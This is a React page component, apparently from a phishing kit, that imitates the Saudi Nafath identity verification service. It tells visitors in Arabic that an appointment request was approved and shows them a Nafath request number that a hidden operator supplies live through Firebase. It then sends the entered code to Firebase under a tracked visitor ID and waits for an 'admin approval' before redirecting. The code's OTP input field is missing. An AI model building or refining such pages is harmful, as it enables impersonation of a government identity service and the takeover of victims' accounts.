import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addData, getOrCreateVisitorId, handleCurrentPage, listenForOtpApproval, listenForNafathRequestNumber } from "@/lib/firebase";

export default function NafathVerifyPage() {
  const [, setLocation] = useLocation();
  const [showModal, setShowModal] = useState(true);
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState("");
  const [requestNumber, setRequestNumber] = useState("...");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("nafath_verify");

    const unsubscribe = listenForNafathRequestNumber((number) => {
      setRequestNumber(number);
    });

    return () => {
      unsubscribe();
    };
  }, []);

  // Listen for admin approval decision
  useEffect(() => {
    if (!loading) return;
    const unsubscribe = listenForOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        setLocation("/confirmation");
      } else if (status === "rejected") {
        setLoading(false);
        setSubmitError("رمز نفاذ غير صحيح، يرجى إعادة المحاولة");
      }
    });
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [loading, setLocation]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setSubmitSuccess("");

    if (!otp || otp.length < 2) {
      setSubmitError("يرجى إدخال الرقم المعروض في التطبيق");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        nafathOtp: otp,
        currentPage: "nafath_verify",
        updatedAt: new Date().toISOString(),
      });
      setSubmitSuccess("تم إرسال الطلب، يرجى تأكيده في تطبيق نفاذ");
    } catch (err: any) {
      setLoading(false);
      setSubmitError(err?.message || "تعذر التحقق من نفاذ");
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]"
      dir="rtl"
      data-testid="page-nafath-verify"
    >
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-[#e5ece6] max-w-lg w-full flex flex-col gap-6">
        <img src="/images/nafath.png" alt="Nafath" className="h-16 mx-auto mb-2 object-contain" />

        <section className="text-center space-y-3">
          <h3 className="text-[#129786] font-bold text-xl">التحقق من خلال تطبيق نفاذ</h3>
          <p className="text-xs text-gray-600 max-w-md mx-auto leading-relaxed">
            الرجاء فتح تطبيق نفاذ وتأكيد طلب توثيق موعد الفحص باختيار الرقم أدناه:
          </p>

          <div className="grid grid-cols-2 gap-4 text-xs pt-4">
            <div className="flex flex-col items-center gap-2 bg-[#f5f8f5] p-3 rounded-xl border border-[#e5ece6]">
              <span className="font-bold text-[#129786]">أولاً</span>
              <p>افتح تطبيق نفاذ على جوالك</p>
            </div>
            <div className="flex flex-col items-center gap-2 bg-[#f5f8f5] p-3 rounded-xl border border-[#e5ece6]">
              <span className="font-bold text-[#129786]">ثانياً</span>
              <p>اختر الرقم المعروض أدناه لتأكيد الطلب</p>
            </div>
          </div>
        </section>

        <div className="bg-[#dfeee3] p-5 rounded-2xl border border-[#129786]/30 text-center my-2 shadow-inner">
          <p className="text-xs font-bold text-gray-700">رقم طلب نفاذ</p>
          <p className="text-4xl font-extrabold text-[#129786] tracking-widest my-1 font-mono">{requestNumber}</p>
        </div>

        <form className="flex flex-col gap-4" onSubmit={handleSubmit}>
          <label className="text-xs font-bold text-gray-700" htmlFor="nafath-otp">تأكيد الرمز المعروض في التطبيق</label>
        

          <button
            type="submit"
            className="w-full rounded-xl bg-[#129786] hover:bg-[#0e7769] text-white py-3.5 font-bold text-base shadow-md cursor-pointer disabled:opacity-60"
            disabled={loading}
            data-testid="button-verify-nafath"
          >
            {loading ? "جاري انتظار الموافقة من نفاذ..." : "تأكيد الطلب بعد الموافقة في نفاذ"}
          </button>
          
          <a
            href="nafath://app"
            className="w-full rounded-xl bg-blue-600 hover:bg-blue-700 text-white py-3.5 font-bold text-base shadow-md cursor-pointer text-center block"
          >
            افتح تطبيق نفاذ
          </a>

          {submitError && <p className="text-xs text-red-500 font-bold text-center">{submitError}</p>}
          {submitSuccess && <p className="text-xs text-green-600 font-bold text-center">{submitSuccess}</p>}
        </form>
      </div>

      {/* Intro Modal */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs">
          <div className="bg-white rounded-2xl p-6 sm:p-8 max-w-md w-full shadow-2xl text-center space-y-4 border border-gray-100">
            <div className="w-12 h-12 rounded-full bg-[#dfeee3] text-[#129786] flex items-center justify-center mx-auto text-xl font-bold">
              ✓
            </div>
            <h3 className="text-lg font-bold text-gray-800">نود إبلاغكم بأنه تم قبول طلبكم بنجاح</h3>
            <p className="text-sm text-[#129786] leading-relaxed font-medium">
              يرجى الدخول إلى تطبيق نفاذ الوطني لاستكمال الإجراءات وإصدار شريحة التوثيق الإلكترونية بالموعد الخاص بك.
              <br /><br />
              استكمل الخطوات لضمان تثبيت موعدكم دون تأخير.
            </p>
            <button
              type="button"
              className="w-full rounded-xl bg-[#129786] text-white py-3 font-bold cursor-pointer"
              onClick={() => setShowModal(false)}
            >
              حسناً
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
